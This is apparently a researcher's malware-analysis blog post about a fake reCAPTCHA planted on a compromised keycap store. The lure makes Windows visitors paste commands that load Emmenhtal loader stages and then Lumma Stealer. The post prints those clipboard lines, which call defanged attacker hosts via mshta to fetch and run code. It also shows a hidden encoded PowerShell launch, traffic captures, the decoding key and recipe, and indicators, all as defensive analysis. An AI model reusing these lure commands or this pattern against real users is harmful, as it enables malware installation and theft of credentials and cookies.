---
layout: post
title: Compromised store spread Lumma Stealer using a fake CAPTCHA
description: In a shift in tactics the fake CAPTCHA was added to an existing site,
  instead of using malvertizing or SEO poisoning
image:
  path: "/assets/images/fake-recaptcha.webp"
  alt: Screenshot of the instructions provided by the fake reCAPTCHA
categories:
- Reverse Engineering Malware
tags:
- reCAPTCHA
- WordPress
- PowerShell
- Malware
- Emmenhtal
- Lumma Stealer
date: 2024-12-21 00:51 -0500
---
Threat actors spreading Lumma Stealer have been known to lure people to malicious websites with fake CAPTCHAs using malvertizing or SEO poisoning. Recently they used a different tactic by placing a more polished CAPTCHA on an existing store. For at least two days, `gmkkeyycaps[.]com` hosted a fake CAPTCHA that tried to trick Windows visitors into running malicious commands on their systems. This likely occurred due to an opportunistic attacker exploiting outdated WordPress software or other vulnerability on the store, which didn't have a [great reputation][Reddit] on Reddit even years before it was compromised.

While the website was compromised, it loaded `yandex[.]ru` analytics, which makes it likely that the threat actor is Russian-speaking. The threat actor is likely not picky about which websites to exploit, as a keycap store would be frequented by technology enthusiasts who are more likely to spot a fake reCAPTCHA than the average visitor. In fact, I became a aware of this compromise because someone shopping for GMK keycaps posted about the dangerous prompt on Bluesky, and the post showed up on my [infosec feed](https://bsky.app/profile/seanthegeek.net/feed/infosec).

<blockquote class="bluesky-embed" data-bluesky-uri="at://did:plc:z3uy3b2jspstbruvu3l4ganm/app.bsky.feed.post/3ldbokhyock2m" data-bluesky-cid="bafyreibxy6f5lduiseilskmda7mjd5kwfyb7zcqpa4ulugs5jejjykisve"><p lang="en">the way i damn near fell off my chair when this appeared!

second screenshot is the code it put on my clipboard - a malware downloader, i imagine, i haven&#x27;t unpicked the obfuscation yet

stay safe out there folks!<br><br><a href="https://bsky.app/profile/did:plc:z3uy3b2jspstbruvu3l4ganm/post/3ldbokhyock2m?ref_src=embed">[image or embed]</a></p>&mdash; Richard Gaywood (<a href="https://bsky.app/profile/did:plc:z3uy3b2jspstbruvu3l4ganm?ref_src=embed">@penllawen.favrd.social</a>) <a href="https://bsky.app/profile/did:plc:z3uy3b2jspstbruvu3l4ganm/post/3ldbokhyock2m?ref_src=embed">December 14, 2024 at 11:06 AM</a></blockquote><script async src="https://embed.bsky.app/static/embed.js" charset="utf-8"></script>

Upon visiting the store from a Windows system the the page was blurred and inaccessible, with what looked like a Google reCAPTCHA prompt front and center. However, after clicking the "I'm a not a robot" checkbox a very unusual and dangerous set of "Verification Steps" appeared:

> 1. Press and hold the Windows Key + R [which opens a Run dialog]
> 2. In the verification window press Ctrl + V [which pastes in command(s) that the fake reCAPTCHA has put in the clipboard]
> 3. Press Enter on your keyboard to finish [which executes the commands]

If a visitor did this, the fake CAPTCHA was smart enough to notice, disappear, and allow the visitor to access the website normally, making it look like they passed. However, the visitor actually starts a chain of events that runs malware.

{% include embed/video.html src='/assets/videos/fake-recaptcha.mp4' title='The fake reCAPTCHA in action' %}

## The first loader stage: HTA

The strings that are copied to the clipboard look like this:

```powershell
POWeRsheLL . \*i*\\\\\\\\\\\\\\\\\\\\\\\\\\\\\*2\m??ta.??? https://yxyz.zyxy[.]org/MARBI.mp4?u=[REDACTED UUID] # ✅ ''I am not a robot - reCAPTCHA Verification ID: [REDACTED]''
```

or

```powershell
mshta  https://yxyz.zyxy[.]org/awjxs.captcha?u=[redacted UUID] # ✅ ''I am not a robot - reCAPTCHA Verification ID: [REDACTED]''
```

Either way, this causes the legitimate Microsoft utility `mshta` to download and execute the file at the URL passed to it. The value of the `u=` HTTP `GET` parameter is a UUID that is likely used to identify the web session of the user in order to remove the "CAPTCHA", so it looks like the user passed.

The web server responds with `HTTP 302 Found`, which redirects `mshta` to the actual location of the file to execute in the `Location` header of the response. The response headers also indicate that the threat actor is abusing Cloudflare to hide their infrastructure.

```http
GET /awjxs.captcha?u=[REDACTED] HTTP/1.1
Accept: */*
Accept-Language: en-US
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR [REDACTED]; .NET CLR [REDACTED])
Host: yxyz.zyxy[.]org
Connection: Keep-Alive
```

```http
HTTP/1.1 302 Found
Date: [REDACTED]
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Location: https://rebekkaworm.snuggleam[.]org/time.json
CF-Cache-Status: DYNAMIC
Report-To: [REDACTED]
NEL: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
Server: cloudflare
CF-RAY: 8f2a9af1192ceacc-ORD
alt-svc: h3=":443"; ma=86400
```

```http
GET /time.json HTTP/1.1
Accept: */*
Accept-Language: en-US
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR [REDACTED]; .NET CLR [REDACTED])
Connection: Keep-Alive
Host: rebekkaworm.snuggleam[.]org
```

```http
HTTP/1.1 200 OK
Date: [REDACTED]
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
ETag: [REDACTED]
Last-Modified: Sun, 15 Dec 2024 20:49:17 GMT
Vary: Accept-Encoding
CF-Cache-Status: DYNAMIC
Report-To: [REDACTED]
Server: cloudflare
CF-RAY: 8f2a9b09d8dfe98e-ORD
Content-Encoding: gzip
alt-svc: h3=":443"; ma=86400
server-timing: [REDACTED]
```

The HTTP response headers claim that the file is a JSON file, but is actually a binary. The linux `file` command just calls it `data` and Detect it Easy calls it `Plain text`. ANY.RUN [identified][any.run] this as an instance of [Emmenhtal][Emmenhtal-anyrun], a malware loader first named in [a report][Emmenhtal-orange] by Orange CyberDefense. The content does not match the description in the Orange CyberDefense report, so this might be a new version of Emmenhtal.

`mshta` executes PowerShell in a hidden window, passing in the script as a base64-encoded string. Unfortunately, I not have been to get it to execute properly when passing it to `mshta` from the local filesystem.

SHA256: `45636e25ae21958e6acddf177240c593ef552d2416f5eef98ae20bf778a78efd`<br>
File size: 1.3 MB

## The second loader stage: PowerShell calling downloaded PowerShell

```powershell
"C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe" -w hidden -ep bypass -nop -enc UwBlAHQAL...
```

When decoded and executed this PowerShell script loads and executes the third stage of the loader, a large, heavily-obfuscated PowerShell script.

![A screenshot of the decoded loader script](/assets/images/fake-recaptcha-powershell-loader.webp)

```http
GET https://flac.mindful-journal[.]shop/shell HTTP/1.1
Host: flac.mindful-journal[.]shop
Connection: Keep-Alive
```

```http
HTTP/1.1 200 OK
Date: [REDACTED]
Content-Type: text/plain; charset=utf-8
Content-Length: 9175469
Connection: keep-alive
X-Powered-By: Express
ETag: [REDACTED]
Set-Cookie: connect.sid=[REDACTED]; Path=/; HttpOnly
CF-Cache-Status: DYNAMIC
Server: cloudflare
CF-RAY: 8f2a9b22b8dd1407-ORD
alt-svc: h3=":443"; ma=86400
server-timing: [REDACTED]
```

### Odd traffic

When running this in my lab, I noticed repeated HTTP `GET` requests to to `https://google[.]com/a/cpanel/index.js` after `shell` was downloaded. The first request includes the parameter `google_abuse`, with a long starting with `GOOGLE_ABUSE_EXEMPTION`. `https://google[.]com/a/cpanel/index.js` does not exist, so it seems likely that the threat actor was using `google[.]com` as a placeholder domain and forgot to replace it with their actual domain.

## The third loader stage: PowerShell inception

SHA256: `04b8edf25f9cc5d202d67962d3c7100dcaeffe106eb4c420be6326039244dbd9`<br>
File size: 8.75 MB

This a massive size for a PowerShell script. At first glance, the script looks extremely difficult to decipher. It starts out with over 6,100 lines of randomly named variables being added together, and PowerShell deobfuscation tools like [PowerDecode][PowerDecode] stalled when working with the file.

However, after that most of the file is a byte array, i.e, an array of bytes expressed as decimal numbers with the variable name `dsahg78das`. The size alone indicates that is the data for the next stage. The function to decode and decrypt the byte array is just under it.

![Screenshot of the decoding and decryption function](/assets/images/bytearray_decode_decrypt_function.webp)

This function shows that the bytes are converted into an ASCII string, base64-decoded, and then decrypted using a key from the variable `gdfsodsao`. A simple file search can identify where `gdfsodsao` is set, much further up in the file, at at line 4642 Then, by setting a debugger breakpoint just after that line and running the debugger in a safe environment, the XOR key is revealed to be `AMSI_RESULT_NOT_DETECTED`.

![An annotated screenshot of the Visual Studio Code PowerShell debugger](/assets/images/vscode_debugging_shell.webp)

Now, we have everything we need to decode and decrypt the payload in the byte array. [CyberChef](https://github.com/gchq/CyberChef/tree/master) is perfectly suited for this.

Here's the recipe:

1. From Decimal
2. From Base64
3. XOR with the key `AMSI_RESULT_NOT_DETECTED`

And the result is...another PowerShell script!

![A screenshot of CyberChef decoding and decrypting the byte array](/assets/images/cyberchef_powershell_decode_decrypt.webp)

This script is not obfuscated at all, except for the long base64-encoded string inside it. Decoding that in CyberChef reveals a windows the tell-tale signs of a Windows Portable Executable (PE). It starts with `MZ` and contains the string "This program cannot be run in DOS mode."

Special thanks to Alexandre Matousek at Orange Cyberdefence for guiding me and teaching me not to be discouraged by 1,000+ lines of junk when reversing a malicious Powershell script.

SHA256: `1ad01aac266e1287050cb7e0fbb5f659449af024ddfbb777c65f713721e2263b`<br>
Size: 1.8 MB

## The payload: Lumma Stealer

The final payload is a .NET executable that has been packed using Babel. It is an instance of Lumma Stealer, a modular information stealer (Infostealer) that can download other components to extend its capabilities. In general, Infostealer malware like Lumma Stealer is designed to steal account credentionals, saved passwords in browsers, session cookies, cryptocureency wallets, and more. It may also download and execute other malware.

SHA256: `ed0074c644b448eda3a6fa4b3fd83bdcbebe958cae85b759b1c621cd9162fcc0`<br>
Size: 1.3 MB

## Remaining questions

1. Why doesn't `mshta` run PowerShell when I run `mshta time.json`?
2. What is encoded in the `google_abuse` `GET` parameter?

## Indicators

### Domains

- `yxyz.zyxy[.]org`
- `rebekkaworm.snuggleam[.]org`
- `flac.mindful-journal[.]shop`

### File hashes

- `45636e25ae21958e6acddf177240c593ef552d2416f5eef98ae20bf778a78efd`
- `04b8edf25f9cc5d202d67962d3c7100dcaeffe106eb4c420be6326039244dbd9`
- `1ad01aac266e1287050cb7e0fbb5f659449af024ddfbb777c65f713721e2263b`
- `ed0074c644b448eda3a6fa4b3fd83bdcbebe958cae85b759b1c621cd9162fcc0`

## MITRE ATT&CK techniques

- [T1190: Exploit Public-Facing Application][T1190]
- [T1656: Impersonation][T1656]
- [T1204: User Execution][T1204]
- [T1218.005: System Binary Proxy Execution: Mshta][T1218.005]
- [T1059.001: Command and Scripting Interpreter: PowerShell][T1059.001]
- [T1027.010: Obfuscated Files or Information: Command Obfuscation][T1027.010]
- [T1555: Credentials from Password Stores][T1555]
- [T1539: Steal Web Session Cookie][T1539]

[Reddit]: https://www.reddit.com/r/MechanicalKeyboards/comments/11xda93/beware_of_gmkkeycapscom_theyre_selling_clone_gmk/?rdt=35317
[ANY.RUN]: https://app.any.run/tasks/1fe14da0-9d9e-4fdc-9a09-60ba91a0f46a
[Emmenhtal-Anyrun]: https://any.run/malware-trends/emmenhtal
[Emmenhtal-Orange]: https://www.orangecyberdefense.com/global/blog/cert-news/emmenhtal-a-little-known-loader-distributing-commodity-infostealers-worldwide
[PowerDecode]: https://github.com/Malandrone/PowerDecode
[T1656]: https://attack.mitre.org/techniques/T1656/
[T1190]: https://attack.mitre.org/techniques/T1190/
[T1204]: https://attack.mitre.org/techniques/T1204/
[T1218.005]: https://attack.mitre.org/techniques/T1218/005/
[T1059.001]: https://attack.mitre.org/techniques/T1059/001/
[T1027.010]: https://attack.mitre.org/techniques/T1027/010/
[T1555]: https://attack.mitre.org/techniques/T1555/
[T1539]: https://attack.mitre.org/techniques/T1539/
